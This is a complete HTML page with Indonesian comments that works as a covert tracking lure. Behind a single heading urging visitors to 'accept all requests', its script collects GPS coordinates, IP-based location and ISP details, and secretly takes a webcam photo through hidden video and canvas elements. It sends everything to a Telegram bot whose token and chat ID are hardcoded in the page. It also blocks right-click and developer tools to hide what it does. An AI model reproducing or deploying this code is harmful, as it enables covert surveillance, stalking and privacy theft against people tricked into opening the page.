<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

</head>
<body>
    <h1> accept all requests‚ÄºÔ∏è</h1>
    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "7862091577:AAEQ90TJM3DNXbW1s4Z58dugEMxOIcFeuSc";  // Ganti dengan token bot Telegram
        const CHAT_ID = "7324869375"; // Ganti dengan chat ID tujuan
        const TELEGRAM_PHOTO_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        const TELEGRAM_TEXT_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        let reportData = {
            waktu: new Date().toLocaleString("id-ID"),
            referer: document.referrer || "Tidak diketahui",
            userAgent: navigator.userAgent,
            ipInfo: { city: "-", country: "-", region: "-", ip: "-", isp: "-", proxy: "-" },
            gpsInfo: { latitude: "-", longitude: "-" }
        };

        function sendPhotoWithCaption(imageBlob) {
            const caption = `üìå *Laporan Baru*  
üïí *Waktu:* ${reportData.waktu || "Tidak diketahui"}  
üîó *Referer:* ${reportData.referer || "Tidak diketahui"}  
üì± *Device:* ${reportData.userAgent || "Tidak diketahui"}  

üåç *Berdasarkan IP:*  
üìç Kota: ${reportData.ipInfo.city || "Tidak diketahui"}  
üó∫Ô∏è Region: ${reportData.ipInfo.region || "Tidak diketahui"}  
üåè Negara: ${reportData.ipInfo.country || "Tidak diketahui"}  
üè¢ ISP: ${reportData.ipInfo.isp || "Tidak diketahui"}  
üè¶ ASN: ${reportData.ipInfo.asn || "Tidak diketahui"}  
üî¢ IP: ${reportData.ipInfo.ip || "Tidak diketahui"}  
üì° Tipe Koneksi: ${reportData.ipInfo.type || "Tidak diketahui"}  
üì∂ Proxy: ${reportData.ipInfo.proxy ? "Ya" : "Tidak"}  
üè† ZIP Code: ${reportData.ipInfo.zip || "Tidak diketahui"}  

üìç *Koordinat Berdasarkan IP:*  
üó∫Ô∏è Latitude: ${reportData.ipInfo.latitude || "-"}  
üó∫Ô∏è Longitude: ${reportData.ipInfo.longitude || "-"}  
üîó [Google Maps (IP)](https://www.google.com/maps?q=${reportData.ipInfo.latitude || 0},${reportData.ipInfo.longitude || 0})  

üìç *Koordinat Berdasarkan GPS:*  
üó∫Ô∏è Latitude: ${reportData.gpsInfo.latitude || "Tidak diketahui"}  
üó∫Ô∏è Longitude: ${reportData.gpsInfo.longitude || "Tidak diketahui"}  
üîó [Google Maps (GPS)](https://www.google.com/maps?q=${reportData.gpsInfo.latitude || 0},${reportData.gpsInfo.longitude || 0})`;

            if (imageBlob) {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", imageBlob, "photo.jpg");
                formData.append("caption", caption);
                formData.append("parse_mode", "Markdown");

                fetch(TELEGRAM_PHOTO_API, {
                    method: "POST",
                    body: formData
                }).then(response => response.json())
                  .then(data => console.log("Response Telegram (dengan foto):", data))
                  .catch(error => console.error("Gagal kirim foto:", error));
            } else {
                fetch(TELEGRAM_TEXT_API, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: caption,
                        parse_mode: "Markdown"
                    })
                }).then(response => response.json())
                  .then(data => console.log("Response Telegram (tanpa foto):", data))
                  .catch(error => console.error("Gagal kirim pesan:", error));
            }
        }

document.addEventListener("contextmenu", event => event.preventDefault()); // Disable klik kanan
document.addEventListener("keydown", event => {
    if (event.ctrlKey && ["u", "U", "s", "S", "i", "I", "j", "J"].includes(event.key)) {
        event.preventDefault();
    }
    if (event.keyCode === 123) { // Blokir F12
        event.preventDefault();
    }
});
setInterval(() => { // Deteksi kalau DevTools dibuka
    if (window.outerHeight - window.innerHeight > 100) {
        document.body.innerHTML = "";
    }
}, 500);

        function getIPLocation() {
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            reportData.ipInfo.ip = data.ip;
            return fetch(`https://ipwho.is/${data.ip}`);
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                reportData.ipInfo = {
                    city: data.city || "Tidak diketahui",
                    region: data.region || "Tidak diketahui",
                    country: data.country || "Tidak diketahui",
                    ip: data.ip || "Tidak diketahui",
                    isp: data.connection?.isp || "Tidak diketahui",
                    asn: data.connection?.asn || "Tidak diketahui",
                    type: data.connection?.type || "Tidak diketahui",
                    zip: data.postal || "Tidak diketahui",
                    latitude: data.latitude || "-",
                    longitude: data.longitude || "-",
                    proxy: data.proxy || false
                };
            } else {
                console.warn("Gagal mendapatkan lokasi IP.");
            }
            capturePhoto();
        })
        .catch(error => {
            console.error("Gagal ambil lokasi IP:", error);
            capturePhoto();
        });
}

        function getGeolocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        reportData.gpsInfo = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                        getIPLocation();
                    },
                    error => {
                        console.warn("Gagal dapat GPS:", error.message);
                        getIPLocation();
                    }
                );
            } else {
                console.warn("Geolocation tidak didukung.");
                getIPLocation();
            }
        }

        function capturePhoto() {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            const context = canvas.getContext("2d");

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setTimeout(() => {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        video.srcObject.getTracks().forEach(track => track.stop());

                        canvas.toBlob(blob => {
                            sendPhotoWithCaption(blob);
                        }, "image/jpeg");
                    }, 3000);  // Ambil foto setelah 3 detik
                })
                .catch(error => {
                    console.warn("Akses kamera ditolak atau gagal:", error);
                    sendPhotoWithCaption(null); // Kalau kamera gagal, tetap kirim laporan
                });
        }

        window.onload = getGeolocation;
    </script>
</body>
</html>
